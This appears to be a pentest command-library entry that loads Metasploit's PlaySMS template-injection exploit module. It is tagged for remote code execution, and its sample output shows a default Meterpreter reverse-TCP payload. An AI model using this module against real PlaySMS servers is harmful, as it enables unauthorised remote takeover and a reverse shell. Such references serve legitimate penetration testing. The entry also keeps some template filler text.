---
id: efc4c5ab-3cd8-40c7-ac80-398ef1978e76
name: use-metasploit-playsms-template-injection-module
type: command
executor: metasploit
data: |-
  msfconsole
  use exploit/multi/http/playsms_template_injection
output: |
  msf5 > msfconsole
  [*] Starting the Metasploit Framework console...
  msf5 > use exploit/multi/http/playsms_template_injection
  [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
created_at: '2020-04-27T22:12:42.888897+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
  - Web
tags:
  - exploit
  - rce
verified: true
validated: true
---

# use-metasploit-playsms-template-injection-module

## Command

```metasploit
msfconsole
use exploit/multi/http/playsms_template_injection
```

## Description

This command launches the Metasploit console and loads the PlaySMS template injection exploit module, preparing it for configuration against vulnerable instances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| N/A | No parameters; uses default Metasploit startup | No |

## Examples

### Basic Usage

```metasploit
msfconsole
use exploit/multi/http/playsms_template_injection
```

### Advanced Usage

Run within an existing msfconsole session:

```metasploit
use exploit/multi/http/playsms_template_injection
show options
```

## Expected Output

Description of what output to expect when the command runs successfully.

```
msf5 > msfconsole
[*] Starting the Metasploit Framework console...
msf5 > use exploit/multi/http/playsms_template_injection
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(multi/http/playsms_template_injection) >
```

## Related

- [[procedures/playsms-template-injection-rce-via-metasploit-unauthenticated]]
- [[tools/Metasploit]]
